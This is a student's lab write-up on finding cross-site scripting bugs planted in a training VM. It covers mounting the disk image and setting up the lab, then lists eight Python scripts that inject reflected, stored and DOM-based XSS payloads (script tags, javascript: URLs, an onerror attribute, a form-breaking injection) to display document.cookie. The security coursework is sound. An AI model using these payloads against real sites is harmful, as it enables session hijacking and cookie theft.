# OT Lab 3 Web Security XSS

Artem Abramov



## 1. Assignment Instructions

It’s time to show your web hacking skills. You have a bunch of simple web pages to attack. Your mission is to find XSS planted bugs, but you may be able to find more than that. More specifically, you and your team-mates (2-3 persons per team) are asked to identify XSS bugs in the simple web applications according to a class of vulnerabilities listed in the bug_report.xls file. XSS vulnerabilities planted in: case02, case04, case05, case07, case12, case15, case19, case29.



## 2. Resources
Here is in the cloud storage the VM which includes all expected bugs, download it:
https://mega.nz/file/mVsRTbrB#QwKbjdQ0Z-LNxjB1ayOGLQhFVXDjAd_lAdM77Bqoti8

Alternative: https://yadi.sk/d/L9c1n3bkuJzEOw

The link downloads a VDI file. First it was not clear what OS is this intended for, therefore the first step was to examine VDI contents.

sources (identical info):

- http://nomone.com/2016/11/05/mounting-a-vdi-file-in-ubuntu/
- https://stackoverflow.com/questions/16893306/how-can-i-extract-files-from-vdi

I used qemu utility to mount the contents of VDI file and see the filesystem. 

Install qemu-utils and load kernel module:

```
# apt install qemu-utils
# modprobe nbd
```

Connect via NBD (i.e. perform special mount):

```
# qemu-nbd -c /dev/nbd0 "path/to/image.vdi"
```
View disk and partitions:
```
lsblk
NAME     MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
nbd0      43:0    0    20G  0 disk 
├─nbd0p1  43:1    0    18G  0 part 
├─nbd0p2  43:2    0     1K  0 part 
└─nbd0p5  43:5    0     2G  0 part
```

Get more specific info on partitions to choose what partition to mount. Any of cfdisk, fdisk or parted can be used as below:
```
# parted /dev/nbd0 print
Model: Unknown (unknown)
Disk /dev/nbd0: 21,5GB
Sector size (logical/physical): 512B/512B
Partition Table: msdos
Disk Flags: 

Number  Start   End     Size    Type      File system     Flags
 1      1049kB  19,3GB  19,3GB  primary   ext4            boot
 2      19,3GB  21,5GB  2145MB  extended
 5      19,3GB  21,5GB  2145MB  logical   linux-swap(v1)
```

Mount the ext4 partition:
```
# mkdir /mnt/vdi
# mount /dev/nbd0p1 /mnt/vdi
```

Examine contents:
```
# ls -la /mnt/vdi
total 116
drwxr-xr-x  22 root root  4096 фев 14  2015 .
drwxr-xr-x   3 root root  4096 апр 18 21:15 ..
drwxr-xr-x   2 root root  4096 фев 14  2015 bin
drwxr-xr-x   3 root root  4096 фев 14  2015 boot
drwxrwxr-x   2 root root  4096 фев 14  2015 cdrom
drwxr-xr-x   4 root root  4096 июл 23  2014 dev
drwxr-xr-x 135 root root 12288 апр 13 00:03 etc
drwxr-xr-x   3 root root  4096 фев 14  2015 home
lrwxrwxrwx   1 root root    33 фев 14  2015 initrd.img -> boot/initrd.img-3.13.0-32-generi
drwxr-xr-x  23 root root  4096 фев 14  2015 lib
drwx------   2 root root 16384 фев 14  2015 lost+found
drwxr-xr-x   3 root root  4096 фев 14  2015 media
drwxr-xr-x   2 root root  4096 апр 11  2014 mnt
drwxr-xr-x   3 root root  4096 фев 14  2015 opt
drwxr-xr-x   2 root root  4096 апр 11  2014 proc
drwx------   2 root root  4096 июл 23  2014 root
drwxr-xr-x  12 root root  4096 июл 23  2014 run
drwxr-xr-x   2 root root 12288 фев 14  2015 sbin
drwxr-xr-x   2 root root  4096 июл 23  2014 srv
drwxr-xr-x   2 root root  4096 мар 13  2014 sys
drwxrwxrwt   5 root root  4096 апр 13 00:17 tmp
drwxr-xr-x  10 root root  4096 июл 23  2014 usr
drwxr-xr-x  14 root root  4096 фев 14  2015 var
lrwxrwxrwx   1 root root    30 фев 14  2015 vmlinuz -> boot/vmlinuz-3.13.0-32-generic
```

Clearly this is linux. 

Running the command below to determine if it is 32 or 64 bit:

```
# file /mnt/vdi/usr/bin/dbus-send 
/mnt/vdi/usr/bin/dbus-send: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=b9ef759969ac53437e00ef42cf51e6a13f0e4583, stripped
```

So now we can make an appropriate virtualbox container and boot it.

Finally unmount and disconnect NBD:

```
umount /mnt/vdi
qemu-nbd -d /dev/nbd0
rmmod nbd
```





## 2.1 VM information
The information about tasks is on the following URL: http://www.wsb.com/Assignment2 which points to the local web server.
- OS password
  user: student
  pass: student

- Location of sources 
  /var/www/html/Assignment2/. There are separate web pages, each will contain at least one bug. Your job is to find all the XSS bugs and categorize them.

- Configuration needed

    Set host file such that the www.wsb.com is pointing to VM IP’s, if you want to access VM from your host machine



I added a bridge adapter to my laptop's wireless interface and recorded the ip assigned to the VM (192.168.1.7) then added the ip to my hosts' /etc/hosts file:

```
# cat /etc/hosts
192.168.1.7	www.wsb.com
192.168.1.7	wsb.com
```

Then I setup an ssh server on the VM, this was ubuntu 14.04:

```
sudo apt-get install openssh-server
sudo service ssh start
```

Then to copy files to local machine for easier editing, etc:

```
ssh student@wsb.com 'tar -cf /home/student/archive.tar /var/www/html/Assignment2/'
ssh student@wsb.com 'cat /home/student/archive.tar' > /home/artem/archive.tar
```



## 3 Deliverables and Submission

To report a bug and claim points, you will have to:

- Identify the category of the bugs found
- Second, you have to show that the bug is exploitable by providing an attack script (could be a bash script) which will automatically exploit the bug. It is already specified the target for each bug category that your attack should find/demonstrate in the bug_report.xls


A sample of the script attack is in the folder /var/www/html/Assignment2/sample. Please take a look to see how to structure yours. For each bug, you will have to identify its category, corresponding testcase and point team members. Please include with bug_report.xls file all your attack scripts in a zipped folder



Simplified table from bug_report.xls is show below. 
Its simplified because:

- Student column is not needed because I did not pair with anyone for this lab.
- Flag column is not needed because the flag that the script needs to retrieve is always stored in cookies.
- The mentioned XSS-auditor that was built-into Chrome and Safari is permanently discontinued since 5-August-2019, 
    source: https://www.chromium.org/developers/design-documents/xss-auditor
- There are only three types of XSS in this lab: Persistent, Reflected, Dom-Based
- The scripts should be run without any parameters/flags, but MUST be run with python 3.6

| Bug No. | Bug Categories                | Attack script name |
| ------- | ----------------------------- | ------------------ |
| 1       | a) Server-side persistent XSS | case04.py          |
| 2       | a) Server-side persistent XSS | case19.py          |
| 3       | b) Server-side reflected XSS  | case02.py          |
| 4       | b) Server-side reflected XSS  | case05.py          |
| 5       | b) Server-side reflected XSS  | case07.py          |
| 6       | b) Server-side reflected XSS  | case12.py          |
| 7       | c) DOM-Based XSS              | case15.py          |
| 8       | c) DOM-Based XSS              | case29.py          |



XSS: https://owasp.org/www-community/Types_of_Cross-Site_Scripting
Stored and Reflected: https://owasp.org/www-community/attacks/xss/
DOM-Based: https://owasp.org/www-community/attacks/DOM_Based_XSS



**Scripts were tested with Python 3.6**

For reference the scripts are included below sorted by number:

```python
cat  case02.py
#!/usr/bin/env python3
# pass code via GET as query parameter
import urllib.parse

data = {'name': 'Exploit... <script>alert(document.cookie)</script>'}
data_enc = urllib.parse.urlencode(data)

url_2 = '{}?{}'.format('http://www.wsb.com/Assignment2/case02.php', data_enc)

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```



```python
cat  case04.py
#!/usr/bin/env python3
# same as "sample" we POST code directly to the webserver to avoid checks that are done in javascript

import urllib
import urllib.parse
import urllib.request

# do POST to the form
url_2 = 'http://www.wsb.com/Assignment2/case04.php'
# prepare the value of the form which includes the attack payload
values = dict(title='here i come', content='Exploit... <script>alert(document.cookie)</script>)' )
data = urllib.parse.urlencode(values)
#submit the form
req = urllib.request.Request(url_2, data.encode('utf-8'))
rsp = urllib.request.urlopen(req)
#read the return result
content = rsp.read()

import webbrowser
url = "http://www.wsb.com/Assignment2/case04.php"
new = 2 #open in new window
webbrowser.open(url,new=new)
```



```python
cat  case05.py
#!/usr/bin/env python3
# exploit bookmarklet  https://en.wikipedia.org/wiki/Bookmarklet

payload = 'location=javascript:alert(document.cookie)'
url_2 = 'http://www.wsb.com/Assignment2/case05.php?' + payload

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```



```python
cat  case07.py
#!/usr/bin/env python3
# exploit more complicated bookmarklet  https://en.wikipedia.org/wiki/Bookmarklet
import urllib.parse

payload = {'timer' : '<script>alert(document.cookie)</script>'}
enc_payload = urllib.parse.urlencode(payload)

url_2 = 'http://www.wsb.com/Assignment2/case07.php?' + enc_payload

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```



```python
cat  case12.py
#!/usr/bin/env python3
# exploit payload in GET
import urllib.parse

payload = {'searchterm' : '<script>alert(document.cookie)</script>'}
enc_payload = urllib.parse.urlencode(payload)

url_2 = 'http://www.wsb.com/Assignment2/case12.php?' + enc_payload

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```



```python
cat  case15.py
#!/usr/bin/env python3
# exploit onerror javascript tag https://stackoverflow.com/questions/116967/img-src-tags-and-javascript
import urllib.parse

payload = {'videourl' : 'artem" onerror="javascript:alert(document.cookie)' }
enc_payload = urllib.parse.urlencode(payload)

url_2 = 'http://www.wsb.com/Assignment2/case15.php?' + enc_payload

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```



```python
cat  case19.py
#!/usr/bin/env python3
# same as "case04" and also we specifically target "title" field that is not checked by HTMLpurify

import urllib
import urllib.parse
import urllib.request

# do POST to the form
url_2 = 'http://www.wsb.com/Assignment2/case19.php'
# prepare the value of the form which includes the attack payload
values = dict(title='Exploit... <script>alert(document.cookie)</script>)', content='here i come' )
data = urllib.parse.urlencode(values)
#submit the form
req = urllib.request.Request(url_2, data.encode('utf-8'))
rsp = urllib.request.urlopen(req)
#read the return result
content = rsp.read()

import webbrowser
url = "http://www.wsb.com/Assignment2/case19.php"
new = 2 #open in new window
webbrowser.open(url,new=new)
```



```python
cat  case29.py
#!/usr/bin/env python3

# finish the hidden input tag, finish the form tag, add evil script tag, open form tag like nothing happened

# because onload='javascript:alert()' does not work for INPUT see https://stackoverflow.com/questions/3708850/is-there-an-onload-event-for-input-elements

# because SCRIPT is not allowed inside FORM see https://stackoverflow.com/questions/15354608/about-script-tags-inside-form-tags
import urllib.parse

evil = """artem">
</form>
<script>alert(document.cookie)</script>
<form>
"""

payload = {'secret' : evil }
enc_payload = urllib.parse.urlencode(payload)

url_2 = 'http://www.wsb.com/Assignment2/case29.php?' + enc_payload

import webbrowser
#open in new window
webbrowser.open(url_2, new=2)
```

